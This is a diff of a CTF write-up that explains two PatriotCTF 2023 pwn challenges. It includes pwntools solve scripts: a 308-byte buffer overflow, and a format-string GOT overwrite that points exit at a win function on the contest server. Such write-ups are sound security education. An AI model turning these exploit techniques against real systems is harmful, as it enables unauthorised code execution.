@@ -9,10 +9,10 @@ Welcome to my first Writeup!
 ## PWN
 ---
 <br/>
-<br/>
+<!-- <br/> -->
 
 
-# Guessing Game
+# Guessing Game [100 PTS]
 Lets decompile using Ghidra and rename some variables:
 
 ![decompilation of binary](/assets/pctf2023/pwn/guessinggame/decompiled.png)
@@ -40,7 +40,7 @@ Subtracting 0xc from 0x140 gives us 308, which is how many bytes we need to writ
 
 Here is the final solve script:
 <br/>
-```
+```python
 from pwn import *
 context.binary = binary = ELF('./guessinggame')
 
@@ -50,5 +50,62 @@ payload = b'a'*308
 
 p.sendline(payload)
 p.interactive()
+```
+
+<br/>
+<br/>
+
+# Printshop [384 PTS]
+Again, lets decompile this binary in Ghidra. 
+
+![Printshop binary decompiled](/assets/pctf2023/pwn/printshop/decompiled.png)
+
+<br/>
+
+We can see that there is a format string vulnerability on line 14, since we are taking the user's input and printing it without any format specifiers. This means that the user can supply their own format specifiers like `%n` which can be used to write to memory addresses. 
+<br/>
+
+Also notice that instead of returning, the program calls `exit`. I also saw that there is a win function which is what our target is. 
+<br/>
+![win function](/assets/pctf2023/pwn/printshop/winfunc.png)
+<br/>
+
+We can do a GOT overwrite so that `exit` points to `win`. This means that when the program calls `exit`, it will actually call `win`. For more information on format string vulnerabilities, I recommend going through [pwn.college's format string exploits module](https://pwn.college/cse494-s2023/format-string-exploits). 
+
+Before we do the GOT overwrite, we need to make sure that the GOT has write permissions. To check this, we can use `checksec`, a command line utility to check security protections on a binary. Running `checksec printshop` outputs:
+<br/>
+
+![checksec output](/assets/pctf2023/pwn/printshop/checksec.png)
+
+Since there is `Partial RELRO`, we can overwrite the GOT.
+
+<br/>
+To perform this exploit, we can use pwntools' `fmtstr` class. 
+<br/>
+
+Here is the final solve script:
+<br/>
+```python
+from pwn import *
+context.binary = binary = ELF('./printshop')
+
+def exec_func(payload): # this function is used so that pwntools can find the offset of our input buffer and other things like padding
+        with remote('chal.pctf.competitivecyber.club', 7997) as p:
+                p.sendline(payload)
+                p.recvuntil(b'buisness!')
+                p.recvline()
+                p.recvline()
+                out = p.recvline()
+                log.info(out)
+                return out
+
+#p = process()
+p = remote('chal.pctf.competitivecyber.club', 7997)
+fmtstr = FmtStr(exec_func)
+payload = b'a'*fmtstr.padlen + fmtstr_payload(fmtstr.offset, {binary.got.exit: binary.symbols.win})
+
+p.sendline(payload)
+p.interactive()
+
 ```
 
